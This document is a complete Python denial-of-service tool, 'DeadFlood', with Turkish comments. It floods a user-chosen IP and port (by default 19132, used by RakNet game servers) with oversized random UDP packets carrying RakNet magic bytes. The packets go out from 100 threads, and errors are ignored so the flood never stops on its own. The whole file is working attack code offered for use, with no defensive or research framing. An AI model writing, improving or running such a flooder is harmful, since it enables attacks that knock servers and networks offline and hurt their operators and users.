#!/usr/bin/env python3
"""
DeadFlood💀 - Bandwidth & CPU Killer
Sadece güçlü paketler + çoklu thread
"""

import socket
import struct
import time
import random
import threading
import sys

class DeadFlood:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 19132
        self.raknet_magic = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
        self.is_attacking = False
        self.packets_sent = 0
        self.threads = []
        
    def get_input(self):
        print("=== DeadFlood💀 ===")
        self.target_ip = input("Hedef IP: ").strip() or "127.0.0.1"
        port_input = input("Port [19132]: ").strip()
        self.target_port = int(port_input) if port_input else 19132
        
    def create_jumbo_packet(self):
        """Büyük boyutlu paket - bandwidth tüketsin"""
        packet = bytearray()
        
        # Rastgele büyük packet ID
        packet_id = random.choice([0x01, 0x05, 0x07, 0x09, 0x13, 0x15, 0x83, 0x85, 0x94])
        packet.append(packet_id)
        
        # Magic bytes
        packet.extend(self.raknet_magic)
        
        # Büyük rastgele veri (500-1400 byte)
        jumbo_size = random.randint(500, 1400)
        jumbo_data = bytes([random.randint(0, 255) for _ in range(jumbo_size)])
        packet.extend(jumbo_data)
        
        return bytes(packet)
    
    def create_mtu_packet(self):
        """MTU boyutunda paket - maksimum bandwidth"""
        packet = bytearray()
        packet.append(0x05)  # OCR1 - büyük packet
        packet.extend(self.raknet_magic)
        packet.append(0x00)  # protocol
        
        # MTU boyutunda rastgele veri
        mtu_data = bytes([random.randint(0, 255) for _ in range(1450)])
        packet.extend(mtu_data)
        
        return bytes(packet)
    
    def create_flood_packet(self):
        """Çeşitli flood paketleri"""
        packet_types = [
            self.create_jumbo_packet,
            self.create_mtu_packet
        ]
        return random.choice(packet_types)()
    
    def flood_worker(self, worker_id):
        """Flood işçisi - sürekli paket gönderir"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.1)  # Çok kısa timeout
        
        print(f"[💀] Worker {worker_id} başlatıldı")
        
        while self.is_attacking:
            try:
                # Paket oluştur ve gönder
                packet = self.create_flood_packet()
                sock.sendto(packet, (self.target_ip, self.target_port))
                
                self.packets_sent += 1
                
                # Her 1000 pakette bir log
                if self.packets_sent % 1000 == 0:
                    print(f"[🔥] Toplam {self.packets_sent} paket gönderildi")
                    
            except Exception as e:
                # Hataları görmezden gel, sadece devam et
                pass
        
        sock.close()
        print(f"[💀] Worker {worker_id} durduruldu")
    
    def start_flood(self):
        """Flood saldırısını başlat"""
        print(f"\n[💀] DeadFlood başlatılıyor...")
        print(f"[🎯] Hedef: {self.target_ip}:{self.target_port}")
        print(f"[⚡] Thread'ler oluşturuluyor...\n")
        
        # Saldırıyı başlat
        self.is_attacking = True
        self.packets_sent = 0
        
        # Thread sayısı - CPU'yu zorlamak için yüksek sayı
        thread_count = 100
        
        # Thread'leri başlat
        for i in range(thread_count):
            thread = threading.Thread(target=self.flood_worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print(f"[💀] {thread_count} thread başlatıldı!")
        print("[💀] Flood başladı - Durdurmak için CTRL+C\n")
        
        try:
            # Ana döngü - paket sayısını göster
            while self.is_attacking:
                time.sleep(1)
                print(f"[📊] Anlık paket/sn: {self.packets_sent}")
                self.packets_sent = 0  # Sıfırla
                
        except KeyboardInterrupt:
            print(f"\n[💀] Durduruluyor...")
            self.is_attacking = False
            
            # Thread'lerin bitmesini bekle
            for thread in self.threads:
                thread.join(timeout=1)
            
            print("[💀] DeadFlood durduruldu!")

def main():
    print("=== DeadFlood💀 ===")
    print("Bandwidth & CPU Killer\n")
    
    flood = DeadFlood()
    flood.get_input()
    flood.start_flood()

if __name__ == "__main__":
    main()